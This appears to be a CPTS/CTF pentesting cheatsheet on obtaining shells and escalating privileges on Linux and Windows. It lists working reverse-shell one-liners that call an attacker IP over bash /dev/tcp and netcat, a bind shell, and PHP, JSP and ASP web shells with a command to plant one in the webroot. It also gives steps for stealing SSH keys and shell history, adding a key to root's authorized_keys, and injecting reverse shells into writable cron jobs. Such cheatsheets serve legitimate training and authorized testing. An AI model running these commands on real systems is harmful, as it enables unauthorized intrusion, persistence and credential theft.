# 🧠 CPTS Cheatsheet – Shells & Privilege Escalation

---

# I) Shells

## 🔹 Types of Shells

* **Bash** (Linux)
* **PowerShell** (Windows)

### 🔌 Remote Access Methods

* **SSH** (Linux)
* **WinRM** (Windows)

---

## 🔹 Shell Types

### 1. Reverse Shell

* Target connects **back to attacker**
* Most common & easiest method

#### Listener (Attacker)

```bash
nc -lvnp 4444
```

#### Find your IP

```bash
ip a
ifconfig
ipconfig
```

#### Reverse Shell Examples

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 > /tmp/f
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);..."
```

---

### 2. Bind Shell

* Target opens port → attacker connects

#### Examples

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 > /tmp/f
```

```bash
nc <IP> <PORT>
```

---

### 3. Web Shell

* Execute commands via web server

#### Examples

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

---

## 🔹 Webroot Locations

* Apache → `/var/www/html`
* Nginx → `/usr/local/nginx/html`
* IIS → `C:\inetpub\wwwroot`
* XAMPP → `C:\xampp\htdocs`

---

## 🔹 Upload Web Shell Example

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

## 🔹 Upgrade TTY (IMPORTANT 🔥)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

```bash
Ctrl + Z
stty raw -echo
fg
```

Fix terminal:

```bash
export TERM=xterm-256color
stty rows 67 columns 318
```

---

# II) Privilege Escalation

## 🎯 Goal

* **Linux** → root
* **Windows** → Administrator / SYSTEM

---

## 🔹 Enumeration (Manual)

```bash
id
whoami
uname -a
sudo -l
```

---

## 🔹 Automated Tools

* linEnum
* linuxprivchecker
* Seatbelt (Windows)
* JAWS (Windows)
* PEASS suite

---

## 🔹 What to Look For

### 🔥 1. Kernel / OS

```bash
uname -a
```

### 🔥 2. Installed Software

```bash
dpkg -l
```

---

### 🔥 3. Sudo Privileges

```bash
sudo -l
```

👉 Check exploitable binaries:
https://gtfobins.org/

---

### 🔥 4. SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

---

### 🔥 5. Scheduled Tasks (Cron Jobs)

Important locations:

```bash
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```

👉 If writable → inject reverse shell

---

### 🔥 6. Writable Files

```bash
find / -writable -type f 2>/dev/null
```

---

### 🔥 7. Exposed Credentials

Check:

* config files
* logs
* history

```bash
cat ~/.bash_history
```

---

### 🔥 8. SSH Keys

#### Find SSH directories

```bash
find / -type d -name ".ssh" 2>/dev/null
```

#### Read private key

```bash
cat id_rsa
chmod 600 id_rsa
```

#### Connect

```bash
ssh user@IP -i id_rsa
```

---

### 🔥 Add your SSH key (Privilege Escalation)

```bash
ssh-keygen -f key
```

```bash
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

```bash
ssh root@IP -i key
```

---

# 🧠 Pro Tips

* Always check:

```bash
sudo -l
```

* Then:

```bash
find / -perm -4000 2>/dev/null
```

* Then:

```bash
cat /etc/crontab
```

👉 80% of privesc = these 3

---

# ⚡ Fast CTF Workflow

```bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
find / -writable -type f 2>/dev/null
```

---

# 🔥 Mindset

👉 Enumeration = everything
👉 Tools help, but **you exploit manually**

---
